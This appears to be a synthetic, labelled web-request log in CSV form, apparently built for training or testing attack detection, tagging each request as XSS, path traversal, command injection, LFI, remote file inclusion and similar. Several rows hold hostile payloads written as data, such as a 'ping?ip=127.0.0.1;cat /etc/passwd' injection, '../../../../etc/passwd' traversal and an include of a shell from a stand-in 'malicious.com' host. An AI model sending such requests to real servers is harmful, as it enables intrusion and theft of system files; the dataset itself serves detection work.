ip,timestamp,request,status,size,attack_type
145.75.52.21,2025-03-15 12:35:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4358,XSS_ATTACK
99.14.61.192,2025-03-15 12:35:24,GET /etc/passwd HTTP/1.1,403,2474,PATH_TRAVERSAL
135.93.94.198,2025-03-15 12:35:02,POST /upload-xml HTTP/1.1,200,1787,XXE_ATTACK
40.63.66.230,2025-03-15 12:34:40,POST /upload-xml HTTP/1.1,200,4973,XXE_ATTACK
183.216.122.57,2025-03-15 12:35:18,GET /etc/passwd HTTP/1.1,403,2468,PATH_TRAVERSAL
112.210.114.16,2025-03-15 12:34:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2483,COMMAND_INJECTION
234.70.102.50,2025-03-15 12:34:45,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,876,COMMAND_INJECTION
6.114.252.2,2025-03-15 12:35:17,GET /execute?cmd=whoami HTTP/1.1,200,3014,RCE_ATTACK
155.25.202.94,2025-03-15 12:34:57,POST /change-email?email=attacker@example.com HTTP/1.1,403,3095,CSRF_ATTACK
89.107.246.252,2025-03-15 12:34:52,POST /wp-json/wp/v2/users HTTP/1.1,200,3358,USER_ENUMERATION
69.146.87.40,2025-03-15 12:34:41,POST /upload-xml HTTP/1.1,200,1210,XXE_ATTACK
60.118.87.57,2025-03-15 12:34:52,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1440,COMMAND_INJECTION
32.229.101.75,2025-03-15 12:34:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2839,COMMAND_INJECTION
56.65.2.10,2025-03-15 12:35:21,POST /wp-json/wp/v2/users HTTP/1.1,200,1665,USER_ENUMERATION
79.13.135.123,2025-03-15 12:35:38,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1267,COMMAND_INJECTION
99.81.22.178,2025-03-15 12:35:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1271,XSS_ATTACK
107.3.204.80,2025-03-15 12:35:20,POST /wp-json/wp/v2/users HTTP/1.1,200,1066,USER_ENUMERATION
161.52.149.107,2025-03-15 12:35:36,POST /upload-xml HTTP/1.1,200,937,XXE_ATTACK
210.87.73.20,2025-03-15 12:35:27,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3607,XSS_ATTACK
195.175.237.142,2025-03-15 12:35:17,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2396,COMMAND_INJECTION
229.140.53.233,2025-03-15 12:35:17,GET /etc/passwd HTTP/1.1,403,1036,PATH_TRAVERSAL
18.226.246.58,2025-03-15 12:35:14,GET /api/user?username=admin HTTP/1.1,200,2543,API_ABUSE
216.4.233.201,2025-03-15 12:34:53,GET /api/user?username=admin HTTP/1.1,200,4941,API_ABUSE
118.49.23.182,2025-03-15 12:34:54,POST /wp-json/wp/v2/users HTTP/1.1,200,3609,USER_ENUMERATION
214.43.32.12,2025-03-15 12:34:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3695,XSS_ATTACK
159.16.255.18,2025-03-15 12:34:49,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,766,COMMAND_INJECTION
88.141.231.63,2025-03-15 12:35:30,POST /change-email?email=attacker@example.com HTTP/1.1,403,3320,CSRF_ATTACK
209.161.28.1,2025-03-15 12:34:57,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,752,COMMAND_INJECTION
208.143.94.56,2025-03-15 12:35:04,GET /api/user?username=admin HTTP/1.1,200,4261,API_ABUSE
1.226.31.236,2025-03-15 12:35:32,GET /api/user?username=admin HTTP/1.1,200,4619,API_ABUSE
31.21.116.189,2025-03-15 12:34:56,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3551,XSS_ATTACK
212.125.199.122,2025-03-15 12:35:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4500,REMOTE_FILE_INCLUSION
38.101.104.146,2025-03-15 12:35:04,GET /etc/passwd HTTP/1.1,403,4730,PATH_TRAVERSAL
167.228.183.148,2025-03-15 12:35:10,POST /wp-json/wp/v2/users HTTP/1.1,200,3894,USER_ENUMERATION
157.101.191.55,2025-03-15 12:35:15,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2901,XSS_ATTACK
44.239.78.148,2025-03-15 12:35:27,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4317,XSS_ATTACK
233.51.97.139,2025-03-15 12:34:50,GET /api/user?username=admin HTTP/1.1,200,1469,API_ABUSE
75.1.245.246,2025-03-15 12:35:23,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4165,REMOTE_FILE_INCLUSION
216.94.180.116,2025-03-15 12:35:25,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1329,XSS_ATTACK
138.17.181.6,2025-03-15 12:35:15,GET /etc/passwd HTTP/1.1,403,4846,PATH_TRAVERSAL
173.25.32.104,2025-03-15 12:34:54,GET /execute?cmd=whoami HTTP/1.1,200,2619,RCE_ATTACK
23.81.171.127,2025-03-15 12:35:34,GET /etc/passwd HTTP/1.1,403,4892,PATH_TRAVERSAL
107.79.139.228,2025-03-15 12:35:09,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4252,LFI_ATTACK
75.135.219.55,2025-03-15 12:34:43,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2673,COMMAND_INJECTION
127.112.206.120,2025-03-15 12:35:41,GET /api/user?username=admin HTTP/1.1,200,1655,API_ABUSE
15.115.221.11,2025-03-15 12:34:52,GET /etc/passwd HTTP/1.1,403,845,PATH_TRAVERSAL
117.215.19.114,2025-03-15 12:34:58,POST /change-email?email=attacker@example.com HTTP/1.1,403,1508,CSRF_ATTACK
229.245.169.3,2025-03-15 12:35:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4952,XSS_ATTACK
54.203.31.152,2025-03-15 12:34:45,GET /execute?cmd=whoami HTTP/1.1,200,2932,RCE_ATTACK
150.224.83.200,2025-03-15 12:35:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4441,REMOTE_FILE_INCLUSION
181.62.154.182,2025-03-15 12:34:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2696,REMOTE_FILE_INCLUSION
14.73.10.7,2025-03-15 12:34:44,GET /execute?cmd=whoami HTTP/1.1,200,2090,RCE_ATTACK
37.134.213.233,2025-03-15 12:34:53,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4397,REMOTE_FILE_INCLUSION
31.19.18.225,2025-03-15 12:35:36,POST /wp-json/wp/v2/users HTTP/1.1,200,1353,USER_ENUMERATION
25.33.222.248,2025-03-15 12:34:55,POST /upload-xml HTTP/1.1,200,1449,XXE_ATTACK
80.227.231.208,2025-03-15 12:34:47,POST /wp-json/wp/v2/users HTTP/1.1,200,2892,USER_ENUMERATION
12.233.233.155,2025-03-15 12:34:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2963,REMOTE_FILE_INCLUSION
45.105.113.240,2025-03-15 12:35:33,POST /upload-xml HTTP/1.1,200,3647,XXE_ATTACK
115.157.146.214,2025-03-15 12:34:46,GET /api/user?username=admin HTTP/1.1,200,3812,API_ABUSE
4.102.135.202,2025-03-15 12:35:18,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3709,REMOTE_FILE_INCLUSION
15.113.85.251,2025-03-15 12:35:01,POST /change-email?email=attacker@example.com HTTP/1.1,403,3598,CSRF_ATTACK
43.240.42.141,2025-03-15 12:35:37,GET /etc/passwd HTTP/1.1,403,1889,PATH_TRAVERSAL
64.248.227.24,2025-03-15 12:35:28,GET /execute?cmd=whoami HTTP/1.1,200,908,RCE_ATTACK
21.182.122.126,2025-03-15 12:35:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2175,LFI_ATTACK
124.43.41.28,2025-03-15 12:35:10,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1544,COMMAND_INJECTION
236.222.31.130,2025-03-15 12:35:20,GET /execute?cmd=whoami HTTP/1.1,200,2100,RCE_ATTACK
137.214.125.221,2025-03-15 12:35:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4523,REMOTE_FILE_INCLUSION
29.254.238.171,2025-03-15 12:35:31,POST /wp-json/wp/v2/users HTTP/1.1,200,2704,USER_ENUMERATION
208.184.239.137,2025-03-15 12:35:19,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1110,COMMAND_INJECTION
253.136.117.71,2025-03-15 12:35:03,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1551,REMOTE_FILE_INCLUSION
198.15.53.90,2025-03-15 12:35:05,GET /api/user?username=admin HTTP/1.1,200,1473,API_ABUSE
153.193.119.34,2025-03-15 12:35:17,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1591,COMMAND_INJECTION
183.137.184.238,2025-03-15 12:35:42,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1319,COMMAND_INJECTION
232.132.123.122,2025-03-15 12:34:44,POST /upload-xml HTTP/1.1,200,1782,XXE_ATTACK
71.32.31.219,2025-03-15 12:35:15,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1673,REMOTE_FILE_INCLUSION
109.27.2.86,2025-03-15 12:34:50,GET /etc/passwd HTTP/1.1,403,4935,PATH_TRAVERSAL
186.85.24.138,2025-03-15 12:35:17,GET /api/user?username=admin HTTP/1.1,200,3932,API_ABUSE
154.145.163.52,2025-03-15 12:34:52,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2679,REMOTE_FILE_INCLUSION
210.247.102.29,2025-03-15 12:34:54,POST /change-email?email=attacker@example.com HTTP/1.1,403,4360,CSRF_ATTACK
149.73.138.8,2025-03-15 12:34:54,GET /api/user?username=admin HTTP/1.1,200,999,API_ABUSE
103.253.229.49,2025-03-15 12:35:07,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,635,COMMAND_INJECTION
89.159.245.169,2025-03-15 12:34:51,POST /wp-json/wp/v2/users HTTP/1.1,200,3637,USER_ENUMERATION
214.238.77.86,2025-03-15 12:35:18,GET /etc/passwd HTTP/1.1,403,1606,PATH_TRAVERSAL
4.148.88.88,2025-03-15 12:35:36,GET /api/user?username=admin HTTP/1.1,200,843,API_ABUSE
163.225.182.37,2025-03-15 12:35:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2717,XSS_ATTACK
155.251.17.244,2025-03-15 12:34:48,POST /change-email?email=attacker@example.com HTTP/1.1,403,1597,CSRF_ATTACK
253.38.242.217,2025-03-15 12:35:16,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1204,REMOTE_FILE_INCLUSION
193.118.195.129,2025-03-15 12:35:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4398,LFI_ATTACK
224.200.143.154,2025-03-15 12:34:47,GET /api/user?username=admin HTTP/1.1,200,4991,API_ABUSE
145.212.145.248,2025-03-15 12:35:05,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,3792,LFI_ATTACK
243.81.252.50,2025-03-15 12:34:52,GET /execute?cmd=whoami HTTP/1.1,200,3740,RCE_ATTACK
237.6.2.156,2025-03-15 12:35:40,GET /execute?cmd=whoami HTTP/1.1,200,4187,RCE_ATTACK
207.252.173.102,2025-03-15 12:34:55,GET /etc/passwd HTTP/1.1,403,2385,PATH_TRAVERSAL
244.115.62.121,2025-03-15 12:35:21,GET /api/user?username=admin HTTP/1.1,200,1128,API_ABUSE
12.45.223.16,2025-03-15 12:35:43,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4349,COMMAND_INJECTION
101.153.149.30,2025-03-15 12:34:56,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,4132,LFI_ATTACK
253.117.207.95,2025-03-15 12:34:46,GET /api/user?username=admin HTTP/1.1,200,3673,API_ABUSE
46.20.99.127,2025-03-15 12:35:27,GET /api/user?username=admin HTTP/1.1,200,738,API_ABUSE
51.49.149.52,2025-03-15 12:35:36,POST /upload-xml HTTP/1.1,200,4086,XXE_ATTACK
21.95.129.229,2025-03-15 12:35:35,GET /etc/passwd HTTP/1.1,403,2567,PATH_TRAVERSAL
156.43.196.20,2025-03-15 12:34:52,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2155,LFI_ATTACK
56.84.255.164,2025-03-15 12:35:09,GET /api/user?username=admin HTTP/1.1,200,4459,API_ABUSE
111.248.97.99,2025-03-15 12:34:54,GET /etc/passwd HTTP/1.1,403,4197,PATH_TRAVERSAL
164.149.20.197,2025-03-15 12:35:02,POST /wp-json/wp/v2/users HTTP/1.1,200,2659,USER_ENUMERATION
37.138.68.22,2025-03-15 12:34:50,POST /change-email?email=attacker@example.com HTTP/1.1,403,1669,CSRF_ATTACK
231.216.20.113,2025-03-15 12:35:25,POST /upload-xml HTTP/1.1,200,3496,XXE_ATTACK
94.222.182.63,2025-03-15 12:34:53,POST /upload-xml HTTP/1.1,200,3606,XXE_ATTACK
146.129.213.112,2025-03-15 12:35:35,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,1379,LFI_ATTACK
143.225.19.233,2025-03-15 12:34:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4673,XSS_ATTACK
48.194.113.218,2025-03-15 12:35:42,POST /change-email?email=attacker@example.com HTTP/1.1,403,2615,CSRF_ATTACK
214.220.77.183,2025-03-15 12:35:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3104,XSS_ATTACK
192.186.232.36,2025-03-15 12:35:32,POST /upload-xml HTTP/1.1,200,1499,XXE_ATTACK
35.117.158.232,2025-03-15 12:34:46,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1294,REMOTE_FILE_INCLUSION
215.179.164.2,2025-03-15 12:35:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2816,LFI_ATTACK
196.69.112.110,2025-03-15 12:34:52,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1813,COMMAND_INJECTION
132.111.37.165,2025-03-15 12:34:46,GET /api/user?username=admin HTTP/1.1,200,3114,API_ABUSE
109.235.128.133,2025-03-15 12:34:58,POST /change-email?email=attacker@example.com HTTP/1.1,403,1605,CSRF_ATTACK
242.163.69.5,2025-03-15 12:35:21,GET /api/user?username=admin HTTP/1.1,200,3858,API_ABUSE
170.199.8.142,2025-03-15 12:34:46,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2226,XSS_ATTACK
107.90.143.39,2025-03-15 12:35:08,GET /execute?cmd=whoami HTTP/1.1,200,4458,RCE_ATTACK
114.53.60.119,2025-03-15 12:35:25,GET /execute?cmd=whoami HTTP/1.1,200,2732,RCE_ATTACK
131.138.151.254,2025-03-15 12:35:44,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4839,REMOTE_FILE_INCLUSION
44.181.61.106,2025-03-15 12:35:12,POST /change-email?email=attacker@example.com HTTP/1.1,403,2533,CSRF_ATTACK
85.162.179.122,2025-03-15 12:34:50,GET /api/user?username=admin HTTP/1.1,200,1370,API_ABUSE
61.138.37.117,2025-03-15 12:35:13,GET /api/user?username=admin HTTP/1.1,200,1052,API_ABUSE
191.253.161.122,2025-03-15 12:35:17,POST /upload-xml HTTP/1.1,200,3658,XXE_ATTACK
255.180.176.227,2025-03-15 12:35:22,GET /api/user?username=admin HTTP/1.1,200,3589,API_ABUSE
55.61.113.206,2025-03-15 12:35:23,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,1165,LFI_ATTACK
219.105.233.84,2025-03-15 12:35:02,POST /change-email?email=attacker@example.com HTTP/1.1,403,4012,CSRF_ATTACK
150.224.166.104,2025-03-15 12:34:58,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2151,LFI_ATTACK
190.95.92.228,2025-03-15 12:35:38,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2810,REMOTE_FILE_INCLUSION
35.50.204.126,2025-03-15 12:35:35,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,691,COMMAND_INJECTION
249.201.135.17,2025-03-15 12:35:15,POST /upload-xml HTTP/1.1,200,2143,XXE_ATTACK
82.13.97.247,2025-03-15 12:35:46,POST /wp-json/wp/v2/users HTTP/1.1,200,1355,USER_ENUMERATION
85.50.2.60,2025-03-15 12:34:51,POST /wp-json/wp/v2/users HTTP/1.1,200,4296,USER_ENUMERATION
145.4.90.202,2025-03-15 12:35:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3034,XSS_ATTACK
59.89.30.115,2025-03-15 12:34:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4837,XSS_ATTACK
187.241.27.52,2025-03-15 12:35:38,GET /etc/passwd HTTP/1.1,403,2120,PATH_TRAVERSAL
125.59.185.24,2025-03-15 12:35:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2229,XSS_ATTACK
235.88.107.137,2025-03-15 12:35:44,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2660,REMOTE_FILE_INCLUSION
30.209.229.144,2025-03-15 12:35:29,GET /api/user?username=admin HTTP/1.1,200,2374,API_ABUSE
151.95.188.163,2025-03-15 12:34:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4248,XSS_ATTACK
80.124.219.159,2025-03-15 12:35:04,POST /wp-json/wp/v2/users HTTP/1.1,200,1450,USER_ENUMERATION
205.166.163.35,2025-03-15 12:34:48,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4298,REMOTE_FILE_INCLUSION
76.63.36.113,2025-03-15 12:35:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1940,XSS_ATTACK
22.18.170.215,2025-03-15 12:35:30,POST /change-email?email=attacker@example.com HTTP/1.1,403,4985,CSRF_ATTACK
83.225.145.105,2025-03-15 12:35:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4757,XSS_ATTACK
189.3.75.6,2025-03-15 12:34:55,POST /change-email?email=attacker@example.com HTTP/1.1,403,1111,CSRF_ATTACK
147.191.111.245,2025-03-15 12:35:44,POST /wp-json/wp/v2/users HTTP/1.1,200,3812,USER_ENUMERATION
23.171.17.226,2025-03-15 12:35:44,POST /change-email?email=attacker@example.com HTTP/1.1,403,2555,CSRF_ATTACK
248.24.58.168,2025-03-15 12:35:31,GET /execute?cmd=whoami HTTP/1.1,200,2257,RCE_ATTACK
188.207.121.146,2025-03-15 12:35:23,GET /api/user?username=admin HTTP/1.1,200,656,API_ABUSE
71.255.171.172,2025-03-15 12:35:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2108,XSS_ATTACK
60.182.94.6,2025-03-15 12:35:29,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2034,XSS_ATTACK
81.201.4.63,2025-03-15 12:35:25,POST /wp-json/wp/v2/users HTTP/1.1,200,1020,USER_ENUMERATION
180.14.26.98,2025-03-15 12:35:14,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3081,REMOTE_FILE_INCLUSION
226.112.246.165,2025-03-15 12:35:47,GET /execute?cmd=whoami HTTP/1.1,200,4665,RCE_ATTACK
178.132.95.138,2025-03-15 12:35:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4857,REMOTE_FILE_INCLUSION
3.48.244.110,2025-03-15 12:35:08,POST /change-email?email=attacker@example.com HTTP/1.1,403,3266,CSRF_ATTACK
18.206.13.171,2025-03-15 12:35:23,GET /api/user?username=admin HTTP/1.1,200,1088,API_ABUSE
239.82.140.9,2025-03-15 12:35:45,GET /etc/passwd HTTP/1.1,403,4930,PATH_TRAVERSAL
201.166.160.17,2025-03-15 12:35:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4584,COMMAND_INJECTION
223.236.87.182,2025-03-15 12:35:27,POST /change-email?email=attacker@example.com HTTP/1.1,403,4440,CSRF_ATTACK
98.47.176.223,2025-03-15 12:35:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3513,XSS_ATTACK
231.44.26.17,2025-03-15 12:35:38,GET /etc/passwd HTTP/1.1,403,3895,PATH_TRAVERSAL
155.76.26.241,2025-03-15 12:34:57,GET /api/user?username=admin HTTP/1.1,200,4609,API_ABUSE
182.63.3.63,2025-03-15 12:35:34,POST /upload-xml HTTP/1.1,200,1582,XXE_ATTACK
130.219.119.170,2025-03-15 12:34:54,POST /change-email?email=attacker@example.com HTTP/1.1,403,1943,CSRF_ATTACK
30.37.98.42,2025-03-15 12:35:28,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1025,REMOTE_FILE_INCLUSION
148.88.171.79,2025-03-15 12:35:12,GET /execute?cmd=whoami HTTP/1.1,200,4318,RCE_ATTACK
40.93.21.183,2025-03-15 12:35:39,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,1686,LFI_ATTACK
79.70.44.93,2025-03-15 12:35:44,GET /etc/passwd HTTP/1.1,403,1583,PATH_TRAVERSAL
222.166.85.117,2025-03-15 12:35:11,POST /change-email?email=attacker@example.com HTTP/1.1,403,1403,CSRF_ATTACK
242.226.38.90,2025-03-15 12:35:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1887,XSS_ATTACK
227.55.45.104,2025-03-15 12:34:54,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3212,COMMAND_INJECTION
51.120.170.121,2025-03-15 12:35:45,POST /upload-xml HTTP/1.1,200,2522,XXE_ATTACK
136.64.76.131,2025-03-15 12:35:23,POST /wp-json/wp/v2/users HTTP/1.1,200,3607,USER_ENUMERATION
91.232.223.58,2025-03-15 12:34:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1404,XSS_ATTACK
67.200.61.61,2025-03-15 12:35:19,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2839,REMOTE_FILE_INCLUSION
208.215.232.46,2025-03-15 12:35:15,GET /etc/passwd HTTP/1.1,403,1755,PATH_TRAVERSAL
17.31.131.182,2025-03-15 12:35:12,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3929,REMOTE_FILE_INCLUSION
199.81.209.122,2025-03-15 12:34:55,GET /etc/passwd HTTP/1.1,403,3160,PATH_TRAVERSAL
51.147.226.136,2025-03-15 12:35:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4987,REMOTE_FILE_INCLUSION
240.110.190.252,2025-03-15 12:35:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1922,XSS_ATTACK
204.147.198.251,2025-03-15 12:35:17,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2025,LFI_ATTACK
66.113.25.1,2025-03-15 12:35:44,GET /api/user?username=admin HTTP/1.1,200,4579,API_ABUSE
147.71.139.240,2025-03-15 12:34:52,GET /etc/passwd HTTP/1.1,403,4282,PATH_TRAVERSAL
106.136.204.126,2025-03-15 12:34:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2415,XSS_ATTACK
63.105.42.113,2025-03-15 12:35:19,POST /upload-xml HTTP/1.1,200,3964,XXE_ATTACK
226.252.228.156,2025-03-15 12:34:58,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,933,REMOTE_FILE_INCLUSION
201.120.106.159,2025-03-15 12:35:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2436,XSS_ATTACK
30.183.89.165,2025-03-15 12:35:13,GET /api/user?username=admin HTTP/1.1,200,4282,API_ABUSE
197.39.217.140,2025-03-15 12:34:54,GET /api/user?username=admin HTTP/1.1,200,4152,API_ABUSE
161.51.211.72,2025-03-15 12:35:36,GET /api/user?username=admin HTTP/1.1,200,1576,API_ABUSE
138.245.121.138,2025-03-15 12:35:07,POST /wp-json/wp/v2/users HTTP/1.1,200,971,USER_ENUMERATION
165.215.181.123,2025-03-15 12:35:35,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,1710,LFI_ATTACK
172.94.165.86,2025-03-15 12:35:05,POST /wp-json/wp/v2/users HTTP/1.1,200,3404,USER_ENUMERATION
47.3.185.78,2025-03-15 12:35:41,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2697,LFI_ATTACK
132.131.63.146,2025-03-15 12:35:42,POST /wp-json/wp/v2/users HTTP/1.1,200,1450,USER_ENUMERATION
213.25.197.45,2025-03-15 12:35:39,POST /upload-xml HTTP/1.1,200,3047,XXE_ATTACK
153.60.153.83,2025-03-15 12:35:29,GET /execute?cmd=whoami HTTP/1.1,200,1930,RCE_ATTACK
28.36.176.75,2025-03-15 12:34:59,POST /change-email?email=attacker@example.com HTTP/1.1,403,2274,CSRF_ATTACK
95.7.40.242,2025-03-15 12:35:36,GET /execute?cmd=whoami HTTP/1.1,200,1458,RCE_ATTACK
59.35.132.251,2025-03-15 12:35:11,GET /api/user?username=admin HTTP/1.1,200,619,API_ABUSE
233.23.19.5,2025-03-15 12:35:49,GET /execute?cmd=whoami HTTP/1.1,200,2505,RCE_ATTACK
82.101.34.108,2025-03-15 12:34:56,POST /change-email?email=attacker@example.com HTTP/1.1,403,2852,CSRF_ATTACK
105.167.255.167,2025-03-15 12:35:20,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1761,COMMAND_INJECTION
182.143.89.104,2025-03-15 12:35:06,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4058,COMMAND_INJECTION
110.116.157.66,2025-03-15 12:35:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2009,XSS_ATTACK
130.206.119.182,2025-03-15 12:35:46,POST /wp-json/wp/v2/users HTTP/1.1,200,3828,USER_ENUMERATION
114.49.68.7,2025-03-15 12:35:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4220,COMMAND_INJECTION
68.118.171.14,2025-03-15 12:34:59,GET /index.php?page=../../../../etc/passwd HTTP/1.1,200,2879,LFI_ATTACK
166.205.147.132,2025-03-15 12:35:22,POST /upload-xml HTTP/1.1,200,746,XXE_ATTACK
111.209.113.228,2025-03-15 12:35:44,GET /api/user?username=admin HTTP/1.1,200,850,API_ABUSE
213.88.92.126,2025-03-15 12:35:22,POST /wp-json/wp/v2/users HTTP/1.1,200,1167,USER_ENUMERATION
173.6.202.40,2025-03-15 12:35:10,GET /api/user?username=admin HTTP/1.1,200,2304,API_ABUSE
194.145.186.60,2025-03-15 12:35:46,GET /api/user?username=admin HTTP/1.1,200,4501,API_ABUSE
205.209.192.124,2025-03-15 12:35:39,GET /execute?cmd=whoami HTTP/1.1,200,1018,RCE_ATTACK
199.144.145.220,2025-03-15 12:34:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4741,XSS_ATTACK
139.159.201.181,2025-03-15 12:35:09,GET /execute?cmd=whoami HTTP/1.1,200,3833,RCE_ATTACK
209.124.3.42,2025-03-15 12:35:26,GET /execute?cmd=whoami HTTP/1.1,200,2150,RCE_ATTACK
210.111.164.161,2025-03-15 12:35:41,GET /api/user?username=admin HTTP/1.1,200,3959,API_ABUSE
87.173.62.203,2025-03-15 12:35:10,GET /etc/passwd HTTP/1.1,403,507,PATH_TRAVERSAL
75.93.231.12,2025-03-15 12:35:41,POST /wp-json/wp/v2/users HTTP/1.1,200,4487,USER_ENUMERATION
